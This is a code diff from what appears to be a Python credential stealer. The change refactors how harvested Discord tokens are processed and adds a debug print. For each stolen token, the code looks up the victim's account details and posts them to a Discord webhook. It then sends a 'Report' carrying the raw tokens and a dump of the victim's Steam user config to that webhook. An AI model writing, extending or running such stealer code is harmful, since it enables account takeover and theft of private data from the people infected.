@@ -101,6 +101,7 @@ class Main:
         tokens = self.token()
 
         for token in tokens:
+            webhook = self.webhook
             userinfo = nukelib.account_info(token)
             
             embed = DiscordEmbed(title=userinfo["username"], icon_url=f"https://cdn.discordapp.com/avatars/{userinfo['id']}/{userinfo['avatar']}")
@@ -113,14 +114,15 @@ class Main:
 
             embed.set_timestamp()
 
-            self.webhook.add_embed(embed)
-            r = self.webhook.execute()
-        
-        embed = DiscordEmbed(title="Report")
-        embed.add_embed_field(name='Tokens', value='`'+str(token)+'`')
-        embed.add_embed_field(name='Steam user config', value='```'+vdf.dumps(userConfig, True)+'```')
-        embed.set_timestamp()
-        self.webhook.add_embed(embed)
+            webhook.add_embed(embed)
+            r = webhook.execute()
+            
+        print("a")
+        report = DiscordEmbed(title="Report")
+        report.add_embed_field(name='Tokens', value='`'+str(token)+'`')
+        report.add_embed_field(name='Steam user config', value='```'+vdf.dumps(userConfig, True)+'```')
+        report.set_timestamp()
+        self.webhook.add_embed(report)
         r = self.webhook.execute()
 
 
